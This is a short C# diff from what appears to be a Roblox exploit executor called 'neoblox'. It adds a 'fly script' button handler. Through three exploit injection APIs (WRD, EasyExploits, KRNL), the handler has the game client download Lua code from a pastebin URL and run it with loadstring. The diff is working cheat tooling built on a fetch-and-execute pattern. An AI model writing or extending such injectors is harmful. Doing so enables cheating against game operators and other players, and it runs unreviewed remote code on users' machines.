@@ -351,5 +351,21 @@ namespace neoblox
                 page1 = true;
             }
         }
+
+        private void flyScript_Click(object sender, EventArgs e)
+        {
+            if (wrdExploitAPI.isAPIAttached())
+            {
+                wrdExploitAPI.SendLuaScript("loadstring(game: HttpGet('https://pastebin.com/raw/ETeUDwvV'))();");
+            }
+            if (easyExploitsAPI.isInjected())
+            {
+                easyExploitsAPI.ExecuteScript("loadstring(game: HttpGet('https://pastebin.com/raw/ETeUDwvV'))();");
+            }
+            if (krnlExploitAPI.IsInjected())
+            {
+                krnlExploitAPI.Execute("loadstring(game: HttpGet('https://pastebin.com/raw/ETeUDwvV'))();");
+            }
+        }
     }
 }
